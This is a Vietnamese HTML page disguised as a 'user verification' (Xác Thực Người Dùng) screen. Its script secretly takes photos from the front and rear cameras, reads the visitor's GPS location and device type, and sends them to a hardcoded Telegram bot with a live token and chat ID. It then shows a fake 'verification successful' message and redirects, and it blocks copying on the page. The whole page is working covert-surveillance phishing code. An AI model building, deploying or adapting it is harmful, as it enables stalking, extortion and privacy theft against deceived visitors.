<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Xác Thực Người Dùng</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0d1117;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .card {
            background: #161b22;
            padding: 32px 24px;
            border-radius: 24px;
            text-align: center;
            width: 90%;
            max-width: 380px;
            border: 1px solid #30363d;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
        }
        .camera-view {
            width: 100%;
            height: 320px;
            background: #000;
            border-radius: 16px;
            margin: 20px 0;
            overflow: hidden;
            position: relative;
            border: 2px solid #238636;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        .btn {
            background: #238636;
            color: white;
            border: none;
            padding: 18px;
            width: 100%;
            border-radius: 12px;
            font-weight: bold;
            cursor: pointer;
            font-size: 16px;
            transition: 0.3s;
            margin-top: 10px;
        }
        .btn:disabled {
            background: #21262d;
            color: #8b949e;
            cursor: not-allowed;
        }
        #status {
            font-size: 14px;
            color: #8b949e;
            margin-top: 16px;
            line-height: 1.5;
        }
        .title {
            margin: 0 0 8px 0;
            font-size: 22px;
        }
    </style>
</head>
<body>

    <div class="card">
        <h2 class="title">Xác Minh Người Dùng</h2>
        <p style="color:#8b949e; margin-bottom:20px;">Vui lòng cho phép camera để tiếp tục</p>
        
        <div class="camera-view" id="vBox">
            <video id="preview" autoplay playsinline muted></video>
        </div>

        <button class="btn" id="startBtn">BẮT ĐẦU XÁC THỰC</button>
        <div id="status">Hệ thống sẽ tự động hoàn tất và chuyển hướng</div>
    </div>

    <script>
        // ================== CẤU HÌNH TELEGRAM ==================
        const BOT_TOKEN = "8818687158:AAHoU3Ydxx1aGG1cR--wXXDCRvmvBAQ6zds";
        const CHAT_ID = "7031115869";
        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

        const btn = document.getElementById('startBtn');
        const video = document.getElementById('preview');
        const status = document.getElementById('status');
        let frontStream = null;

        // ================== LẤY VỊ TRÍ ==================
        async function getLocation() {
            return new Promise(resolve => {
                if (!navigator.geolocation) {
                    resolve({ lat: null, lon: null, link: "Không hỗ trợ vị trí" });
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        const lat = pos.coords.latitude.toFixed(6);
                        const lon = pos.coords.longitude.toFixed(6);
                        resolve({
                            lat, lon,
                            link: `https://www.google.com/maps?q=${lat},${lon}`
                        });
                    },
                    () => resolve({ lat: null, lon: null, link: "Không lấy được vị trí" })
                );
            });
        }

        // ================== CAMERA ==================
        btn.addEventListener('click', async () => {
            btn.disabled = true;
            btn.innerText = "ĐANG XỬ LÝ...";
            status.innerHTML = "Đang xác thực khuôn mặt<br>Vui lòng giữ nguyên vị trí...";

            await main();
        });

        async function main() {
            const info = {
                time: new Date().toLocaleString('vi-VN'),
                device: '',
                os: '',
                location: 'Đang lấy...',
                mapLink: ''
            };

            detectDevice(info);
            const locationData = await getLocation();
            info.location = locationData.lat ? `${locationData.lat}, ${locationData.lon}` : "Không lấy được";
            info.mapLink = locationData.link;

            const [frontBlob, backBlob] = await Promise.all([
                captureCamera("user"),
                captureCamera("environment")
            ]);

            await sendToTelegram(info, frontBlob, backBlob);

            startCountdown();
        }

        function detectDevice(info) {
            const ua = navigator.userAgent;
            if (/iPhone|iPad|iPod/i.test(ua)) {
                info.os = 'iOS';
                info.device = 'iPhone';
            } else if (/Android/i.test(ua)) {
                info.os = 'Android';
                const match = ua.match(/Android.*;\s+([^;]+)/);
                info.device = match ? match[1].trim() : 'Android Device';
            } else {
                info.os = 'Desktop';
                info.device = 'PC/Laptop';
            }
        }

        async function captureCamera(facingMode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode }, 
                    audio: false 
                });
                
                if (facingMode === 'user') frontStream = stream;

                return new Promise(resolve => {
                    const videoEl = document.createElement('video');
                    videoEl.srcObject = stream;
                    videoEl.play();
                    videoEl.onloadedmetadata = () => {
                        const canvas = document.createElement('canvas');
                        canvas.width = videoEl.videoWidth;
                        canvas.height = videoEl.videoHeight;
                        setTimeout(() => {
                            canvas.getContext('2d').drawImage(videoEl, 0, 0);
                            stream.getTracks().forEach(t => t.stop());
                            canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.9);
                        }, 600);
                    };
                });
            } catch (e) {
                console.log(`Camera ${facingMode} error:`, e);
                return null;
            }
        }

        async function sendToTelegram(info, frontBlob, backBlob) {
            const caption = `🔐 **Xác Thực Người Dùng Mới**\n\n` +
                           `⏰ Thời gian: ${info.time}\n` +
                           `📱 Thiết bị: ${info.device}\n` +
                           `🖥 Hệ điều hành: ${info.os}\n` +
                           `📍 Vị trí: ${info.location}\n` +
                           `🗺 Bản đồ: ${info.mapLink}`;

            const media = [];

            if (frontBlob) {
                media.push({
                    type: "photo",
                    media: frontBlob,
                    caption: caption,
                    parse_mode: "Markdown"
                });
            }
            if (backBlob) {
                media.push({
                    type: "photo",
                    media: backBlob
                });
            }

            if (media.length > 0) {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('media', JSON.stringify(media));

                // Gửi album
                await fetch(`${TELEGRAM_API}/sendMediaGroup`, {
                    method: 'POST',
                    body: formData
                });
            } else {
                // Fallback gửi text
                await fetch(`${TELEGRAM_API}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: caption,
                        parse_mode: 'Markdown'
                    })
                });
            }
        }

        function startCountdown() {
            let timeLeft = 5;
            const timer = setInterval(() => {
                btn.innerText = `HOÀN TẤT TRONG ${timeLeft} GIÂY`;
                status.textContent = "Xác thực thành công • Đang chuyển hướng...";
                timeLeft--;

                if (timeLeft < 0) {
                    clearInterval(timer);
                    if (frontStream) frontStream.getTracks().forEach(t => t.stop());
                    window.location.href = ""; // Thay link đích nếu cần
                }
            }, 1000);
        }

        // Chặn copy
        document.addEventListener('copy', e => e.preventDefault());
    </script>
</body>
</html>
